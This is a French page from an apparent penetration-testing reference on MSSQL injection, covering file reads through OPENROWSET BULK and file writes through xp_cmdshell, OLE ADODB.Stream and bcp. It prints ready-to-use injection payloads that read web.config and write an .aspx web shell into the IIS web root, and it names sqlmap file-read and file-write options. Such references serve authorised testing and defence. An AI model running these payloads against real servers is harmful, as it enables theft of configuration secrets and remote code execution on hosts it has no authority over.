---
order: 5
title: "Lecture et écriture de fichiers via injection MSSQL"
description: "Primitives de lecture et d'écriture de fichiers dans l'injection SQL Server : OPENROWSET BULK pour les lectures, et xp_cmdshell, les flux OLE et bcp pour les écritures, avec les droits que chacune nécessite."
keywords:
  - OPENROWSET BULK
  - ADMINISTER BULK OPERATIONS
  - lecture de fichier
  - bcp
  - écriture xp_cmdshell
---

# Manipulation de fichiers

Un login SQL Server privilégié peut lire et écrire des fichiers de l'hôte, ce qui mène à la divulgation de code source et de configuration et, par l'écriture, à des web shells ou à l'abus de tâches planifiées.

La lecture utilise `OPENROWSET` avec le fournisseur `BULK`, qui nécessite la permission `ADMINISTER BULK OPERATIONS` (détenue par `sysadmin`) :

```sql
' UNION SELECT BulkColumn,NULL,NULL FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config',SINGLE_CLOB) x-- 
```

`SINGLE_CLOB` lit du texte, `SINGLE_NCLOB` du texte Unicode, et `SINGLE_BLOB` du binaire. Sur les versions récentes, `ADMINISTER DATABASE BULK OPERATIONS` plus le droit peuvent s'appliquer, mais `sysadmin` qualifie toujours.

L'écriture a plusieurs voies, toutes nécessitant des droits élevés. Avec `xp_cmdshell` activé, redirigez la sortie vers un fichier :

```sql
'; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#"%^>... > C:\inetpub\wwwroot\s.aspx'-- 
```

Les flux d'automatisation OLE écrivent un fichier via un objet COM quand `xp_cmdshell` est indisponible :

```sql
'; DECLARE @o int; EXEC sp_OACreate 'ADODB.Stream',@o OUT; EXEC sp_OAMethod @o,'Open'; EXEC sp_OAMethod @o,'WriteText',NULL,'<shell/>'; EXEC sp_OAMethod @o,'SaveToFile',NULL,'C:\inetpub\wwwroot\s.aspx',2-- 
```

`bcp` (exécuté via `xp_cmdshell`) exporte aussi les résultats de requête vers un fichier. Écrire dans un répertoire servi par le web dépose un shell qui s'exécute via HTTP ; connaître la racine web (lisez d'abord `web.config` ou la configuration IIS) guide l'endroit où l'écriture doit atterrir. Toutes les voies requièrent que le chemin du fichier soit accessible en écriture par le compte de service SQL Server.

## Outils

- **sqlmap** : lit et écrit les fichiers de l'hôte avec `--file-read` et `--file-write`.
- **PowerUpSQL** : aides pour les lectures OPENROWSET BULK et les écritures de fichiers basées sur commande.

## Références

- Microsoft SQL Server Documentation : OPENROWSET BULK, bcp Utility, OLE Automation
- OWASP Testing Guide : Testing for SQL Injection
